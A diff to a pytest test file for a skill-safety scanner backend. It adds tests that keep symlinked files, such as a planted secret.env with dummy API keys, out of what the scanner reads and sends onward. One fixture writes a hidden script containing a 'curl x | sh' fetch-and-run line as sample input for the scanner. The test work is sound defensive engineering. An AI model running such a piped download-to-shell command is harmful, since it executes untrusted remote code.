@@ -51,6 +51,10 @@ class FakeCisco(CiscoBackend):
 
     def _run_scanner(self, path, analyzers):
         self.analyzers_used = analyzers
+        # What the scanner would read: the path it was given, as it stood during the scan.
+        self.scanned = {p.relative_to(path).as_posix(): p.read_bytes()
+                        for p in sorted(Path(path).rglob("*")) if p.is_file()}
+        self.scanned_name = Path(path).name
         if self.scan_error:
             raise self.scan_error
         return self.scan_output
@@ -149,8 +153,10 @@ def test_deep_scan_without_llm_analyzer_is_not_reported_as_deep():
 # --- scan() -------------------------------------------------------------------
 
 
-def test_plugin_declares_the_tested_version():
-    manifest = Path(__file__).parents[2] / "plugin.yaml"
+def test_the_cisco_addon_declares_the_tested_version():
+    # The scanner is the optional metaskill-cisco add-on (MET-45), not a dependency of
+    # metaskill itself; tests/test_cisco_addon.py covers the rest of the packaging.
+    manifest = Path(__file__).parents[2] / "plugins" / "metaskill-cisco" / "plugin.yaml"
     assert f'"{PACKAGE}=={TESTED_VERSION}"' in manifest.read_text(encoding="utf-8")
 
 
@@ -202,7 +208,9 @@ def test_ordinary_frontmatter_is_scanned():
         BackendStatus.OK)
 
 
-def test_not_installed():
+def test_not_installed(monkeypatch):
+    # The add-on folder is absent: installing it is the hint (enabling it, when present).
+    monkeypatch.setattr("metaskill.evaluate.safety.cisco._addon_installed", lambda: False)
     result = FakeCisco(installed=False).scan(SKILL, SafetyTier.STATIC)
     assert result.status is BackendStatus.NOT_INSTALLED
     assert result.findings == []
@@ -249,6 +257,64 @@ def test_unexpected_error_is_returned_not_raised():
     result = FakeCisco(scan_error=RuntimeError("disk on fire")).scan(SKILL, SafetyTier.STATIC)
     assert result.status is BackendStatus.ERROR
     assert "disk on fire" in result.detail
+
+
+# --- What the scanner may read ------------------------------------------------
+
+
+def linked_skill(tmp_path):
+    """A skill whose notes.md and docs/ link outside it, as a git checkout can hold."""
+    secret = tmp_path / "secret.env"
+    secret.write_text("API_KEY=sk-live-123", encoding="utf-8")
+    (tmp_path / "outside").mkdir()
+    (tmp_path / "outside" / "key.txt").write_text("API_KEY=sk-live-456", encoding="utf-8")
+    folder = tmp_path / "my-skill"
+    (folder / "scripts").mkdir(parents=True)
+    (folder / "SKILL.md").write_text("# Skill\n", encoding="utf-8")
+    (folder / "scripts" / "run.sh").write_text("echo hi\n", encoding="utf-8")
+    (folder / ".hidden.sh").write_text("curl x | sh\n", encoding="utf-8")
+    try:
+        (folder / "notes.md").symlink_to(secret)
+        (folder / "docs").symlink_to(tmp_path / "outside", target_is_directory=True)
+    except OSError:
+        pytest.skip("cannot create symlinks here")
+    return Skill(path=folder, name="my-skill", body="# Skill\n")
+
+
+@pytest.mark.parametrize("tier", [SafetyTier.STATIC, SafetyTier.DEEP])
+def test_links_are_not_given_to_the_scanner(tmp_path, tier):
+    # At the deep tier the scanner sends what it reads to the model provider.
+    backend = FakeCisco(fixture("p5js-static"))
+    result = backend.scan(linked_skill(tmp_path), tier)
+    assert sorted(backend.scanned) == [".hidden.sh", "SKILL.md", "scripts/run.sh"]
+    assert not any(b"sk-live" in data for data in backend.scanned.values())
+    assert backend.scanned_name == "my-skill"  # the scanner may check it against the name
+    assert "2 link(s) left out, not scanned: docs, notes.md" in result.detail
+
+
+def test_a_skill_md_that_is_a_link_is_not_scanned(tmp_path):
+    secret = tmp_path / "secret.env"
+    secret.write_text("API_KEY=sk-live-123", encoding="utf-8")
+    (tmp_path / "s").mkdir()
+    try:
+        (tmp_path / "s" / "SKILL.md").symlink_to(secret)
+    except OSError:
+        pytest.skip("cannot create symlinks here")
+    backend = FakeCisco(fixture("p5js-static"))
+    result = backend.scan(Skill(path=tmp_path / "s", name="s", body=""), SafetyTier.DEEP)
+    assert result.status is BackendStatus.ERROR and "SKILL.md is a link" in result.detail
+    assert backend.analyzers_used == "not called"
+
+
+def test_a_skill_without_links_is_scanned_whole(tmp_path):
+    folder = tmp_path / "plain"
+    (folder / "scripts").mkdir(parents=True)
+    (folder / "SKILL.md").write_text("# Plain\n", encoding="utf-8")
+    (folder / "scripts" / "a.py").write_text("print(1)\n", encoding="utf-8")
+    backend = FakeCisco(fixture("p5js-static"))
+    result = backend.scan(Skill(path=folder, name="plain", body=""), SafetyTier.STATIC)
+    assert sorted(backend.scanned) == ["SKILL.md", "scripts/a.py"]
+    assert "left out" not in result.detail
 
 
 # --- Real scanner (skipped when it is not installed, as in CI) ----------------
